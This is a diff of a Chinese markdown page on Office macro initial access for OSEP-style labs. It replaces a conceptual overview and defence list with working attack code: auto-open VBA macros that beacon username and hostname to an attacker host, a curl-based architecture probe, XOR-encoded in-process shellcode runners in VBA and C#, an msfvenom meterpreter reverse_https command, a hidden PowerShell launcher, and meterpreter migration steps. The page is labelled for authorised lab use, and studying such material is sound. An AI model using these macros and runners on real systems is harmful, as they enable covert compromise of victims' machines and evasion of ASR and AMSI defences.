@@ -1,66 +1,217 @@
 # Office 宏
 
-Word / Excel 宏仍然是客户端执行的常见入口。公开实验里把它当成「带 GUI 的脚本宿主」，而不是「一发入魂的马」。
+::: warning 仅供学习 / 授权实验
+源码用于 OSEP 实验、考试环境和自建 lab。先做无害回调，再换真实 shellcode。禁止对未授权系统使用。
+:::
 
-## 先判断什么
+## 判断顺序
 
-1. **宏有没有真的跑起来**  
-   用无害回调（访问你实验机上的一个空路径、或只写 `%TEMP%` 里一个文件）。没有回调，就不要上任何执行逻辑。
-2. **Office 进程位数**  
-   64 位 Windows 上的 Office 仍可能是 32 位。VBA 的 `PtrSafe` / `LongPtr` 声明必须和 `WINWORD.EXE` 一致，否则直接崩溃。
-3. **失败发生在哪一层**  
-   - 宏被禁用 / 受保护视图 → 用户交互或策略问题  
-   - 宏能跑，但一启动 `powershell.exe` 就失败 → 子进程 / ASR  
-   - PowerShell 起来了，脚本内容被拦 → 脚本扫描，见 [AppLocker 与 AMSI](/topics/applocker-amsi)  
-   - 回连成功，关掉文档会话消失 → 宿主生命周期
+1. 宏有没有跑 → 无害回调  
+2. Office 是 32 还是 64 位 → 探测宏  
+3. 能不能起 PowerShell → 不行就进程内 runner  
+4. 文档关闭后会话在不在 → 迁移
 
-## 三条常见路线（概念）
+## 无害回调（进程内 HTTP，不起子进程）
 
-| 路线 | 含义 | 典型限制 |
-|---|---|---|
-| 宏拉起 PowerShell | 短、好写 | 子进程链显眼；ASR「阻止 Office 创建子进程」会直接杀 |
-| 只在 WINWORD 进程内做事 | 不出现 `powershell.exe` | 实现复杂；位数、内存权限、崩溃都要自己处理 |
-| 宏只做第一阶段 | 下载或触发下一阶段 | 出网、AMSI、第二阶段路径必须已验证 |
+粘进 `ThisDocument`，另存 `.docm`。把 `LHOST` 换成攻击机。
 
-实验室里先走「无害回调 → 位数探测 → 再决定形态」。位数未知时投完整 runner 等于赌博。
+```vb
+Option Explicit
+Private Const SERVER_URL As String = "http://LHOST/m01/callback"
 
-## 公开工具语法
+Private Function HttpGet(ByVal url As String) As Boolean
+    On Error GoTo fail
+    Dim http As Object
+    Set http = CreateObject("MSXML2.XMLHTTP")
+    http.Open "GET", url, False
+    http.setRequestHeader "User-Agent", "Mozilla/5.0"
+    http.Send
+    HttpGet = (http.Status >= 200 And http.Status < 300)
+    Exit Function
+fail:
+    HttpGet = False
+End Function
+
+Private Sub DoCallback()
+    Dim u As String, h As String
+    On Error Resume Next
+    u = Environ("USERNAME")
+    h = Environ("COMPUTERNAME")
+    On Error GoTo 0
+    HttpGet SERVER_URL & "?u=" & u & "&h=" & h
+End Sub
+
+Private Sub RunOnce()
+    Static fired As Boolean
+    If Not fired Then fired = True: DoCallback
+End Sub
+
+Public Sub AutoOpen()
+    RunOnce
+End Sub
+Public Sub Document_Open()
+    RunOnce
+End Sub
+```
+
+攻击机：`python3 -m http.server 80`，日志里要有 `/m01/callback`。
+
+## 位数探测
+
+```vb
+Option Explicit
+Private Const SERVER_URL As String = "http://LHOST:80/arch"
+
+Private Sub SendProcessInfo()
+    Dim wmi As Object, procs As Object, p As Object
+    Dim result As String, is64 As Boolean
+    On Error Resume Next
+    Set wmi = GetObject("winmgmts:\\.\root\CIMV2")
+    Set procs = wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name='winword.exe'")
+    If procs.Count > 0 Then
+        For Each p In procs
+            is64 = (InStr(1, p.CommandLine, "Program Files (x86)", vbTextCompare) = 0)
+            result = "proc=winword&x64=" & CStr(is64)
+        Next
+    End If
+    #If Win64 Then
+        result = result & "&vba_x64=True"
+    #Else
+        result = result & "&vba_x64=False"
+    #End If
+    Shell "cmd.exe /c curl -s -X POST -d """ & result & """ " & SERVER_URL, vbHide
+End Sub
+Sub AutoOpen(): SendProcessInfo: End Sub
+Sub Document_Open(): SendProcessInfo: End Sub
+```
+
+`vba_x64` 最可靠。32 位 Office 必须用 x86 shellcode + 非 PtrSafe 或对应声明。
+
+## 进程内 VBA runner（x64 Office）
+
+`Shell "powershell"` 被 ASR 杀掉时用这条。先生成：
 
 ```bash
-# 生成 VBA 格式的缓冲区（自己粘进宏；本站不提供现成宏文件）
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT EXITFUNC=thread -f vbapplication
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT EXITFUNC=thread --encrypt xor --encrypt-key a -f vbapplication
 ```
 
-`EXITFUNC=thread` 通常比退出整个 Word 进程更适合实验。监听与投递见 [实验环境](/lab/environment)。
+把输出的数组贴进 `GetEncodedShellcode`。下面是骨架：
 
-PowerShell 侧若必须走子进程，先确认语言模式：
+```vb
+Option Explicit
+#If Win64 Then
 
-```powershell
-$ExecutionContext.SessionState.LanguageMode
+Private Const XOR_KEY As Byte = &H61   ' 'a'  与 msfvenom --encrypt-key 一致
+
+Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" ( _
+    ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, _
+    ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+Private Declare PtrSafe Function CreateThread Lib "kernel32" ( _
+    ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As LongPtr, _
+    ByVal lpStartAddress As LongPtr, ByVal lpParameter As LongPtr, _
+    ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As LongPtr
+Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" ( _
+    ByVal Destination As LongPtr, ByRef Source As Any, ByVal Length As LongPtr)
+
+Sub RunShellcode()
+    Dim mem As LongPtr, hThread As LongPtr, sc() As Byte, i As Long
+    sc = GetEncodedShellcode()
+    For i = LBound(sc) To UBound(sc)
+        sc(i) = sc(i) Xor XOR_KEY
+    Next i
+    mem = VirtualAlloc(0, UBound(sc) + 1, &H3000, &H40)
+    If mem = 0 Then Exit Sub
+    RtlMoveMemory mem, sc(0), UBound(sc) + 1
+    hThread = CreateThread(0, 0, mem, 0, 0, 0)
+End Sub
+
+Private Function GetEncodedShellcode() As Byte()
+    ' 把 msfvenom -f vbapplication 的数组贴这里
+    Dim buf As Variant
+    buf = Array(0, 0, 0)   ' REPLACE
+    Dim out() As Byte, i As Long
+    ReDim out(UBound(buf))
+    For i = 0 To UBound(buf): out(i) = buf(i): Next
+    GetEncodedShellcode = out
+End Function
+
+Sub AutoOpen(): RunShellcode: End Sub
+Sub Document_Open(): RunShellcode: End Sub
+#End If
 ```
 
-`ConstrainedLanguage` 下 `Add-Type`、反射、很多动态能力会不可用，不要在这条路上死磕，换宿主或换模块。
+x86 Office 去掉 `PtrSafe`，`LongPtr` 改 `Long`，payload 用 `windows/meterpreter/...`（无 x64）。
 
-## `Add-Type` 临时文件
+## 宏只拉 PowerShell（无 CLM 时）
 
-PowerShell 的 `Add-Type` 常把编译结果写到用户临时目录。有的环境允许脚本运行，但会抽走这些临时 DLL。现象是「PowerShell 起来了，编译型 runner 失败」。这时要改的是**加载方式**（预编译程序集、反射加载），不是再加一层编码。
+```vb
+Sub AutoOpen()
+    Shell "powershell -nop -w hidden -enc BASE64", vbHide
+End Sub
+```
+
+第二阶段被 AMSI 拦 → [AppLocker 与 AMSI](/topics/applocker-amsi)。  
+`Add-Type` 临时文件被删 → 改预编译 C# runner（见该页）。
+
+## C# 预编译 runner（避免 Add-Type）
+
+```bash
+# 目标机
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:r.exe runner.cs
+```
+
+```csharp
+using System;
+using System.Runtime.InteropServices;
+
+class Runner {
+    // XOR 后的 shellcode 的 Base64；key 与生成时一致
+    private const string SHELLCODE_B64 = "REPLACE_WITH_BASE64_XOR_SHELLCODE";
+    private const byte XOR_KEY = 0x2A;
+
+    [DllImport("kernel32")] static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, uint t, uint p);
+    [DllImport("kernel32")] static extern IntPtr CreateThread(IntPtr a, UIntPtr st, IntPtr start, IntPtr par, uint f, out uint id);
+    [DllImport("kernel32")] static extern uint WaitForSingleObject(IntPtr h, uint ms);
+
+    static byte[] Decode() {
+        byte[] d = Convert.FromBase64String(SHELLCODE_B64);
+        for (int i = 0; i < d.Length; i++) d[i] ^= XOR_KEY;
+        return d;
+    }
+    public static void Run() {
+        byte[] sc = Decode();
+        IntPtr mem = VirtualAlloc(IntPtr.Zero, (UIntPtr)sc.Length, 0x3000, 0x40);
+        Marshal.Copy(sc, 0, mem, sc.Length);
+        uint tid;
+        WaitForSingleObject(CreateThread(IntPtr.Zero, UIntPtr.Zero, mem, IntPtr.Zero, 0, out tid), 2000);
+    }
+    static void Main() { Run(); }
+}
+```
+
+生成 Base64：
+
+```bash
+python3 -c "import base64,sys; k=0x2A; d=open('sc.bin','rb').read();
+print(base64.b64encode(bytes(b^k for b in d)).decode())"
+```
 
 ## 生命周期
 
-文档关闭后，VBA 线程和未迁移的会话会一起没。实验里一旦拿到会话，先看同用户下有没有更长寿的进程；迁移、计划任务、服务，都属于「离开 Word 生命周期」的问题，而不是入口问题。
+Word 关掉，未迁移的会话一起没。拿到会话立刻：
 
-## 失败分类
+```
+ps   # meterpreter
+migrate -N explorer.exe
+# 或 migrate <pid>
+```
 
-| 现象 | 先查 |
+## 失败
+
+| 现象 | 做法 |
 |---|---|
-| 完全没有回调 | 宏安全、受保护视图、文件是否真被打开、投递 URL |
-| 回调有，PowerShell 没有 | ASR / 子进程策略；改进程内路线或换 HTA / WSH |
-| 有 PowerShell，脚本被声明恶意 | AMSI / 内容扫描；换宿主，不要只改变量名 |
-| Word 一关就断 | 迁移 / 常驻，不是重新做宏 |
-
-## 防御侧
-
-- 禁用除受信任位置以外的宏；启用受保护视图
-- ASR：阻止 Office 创建子进程、阻止 Office 注入进程
-- 邮件网关拦 `.docm`；把宏执行限制在签名文档
-- 监控 `WINWORD.EXE` → `powershell.exe` / `cmd.exe` / `cscript.exe` 进程链
+| 无回调 | 宏安全 / 受保护视图 / 文件没被打开 |
+| 有回调无 PS | ASR 拦子进程 → 进程内 runner |
+| PS 起来脚本被拦 | AMSI |
+| 崩溃 | 位数错 |
+| 关文档就断 | migrate |
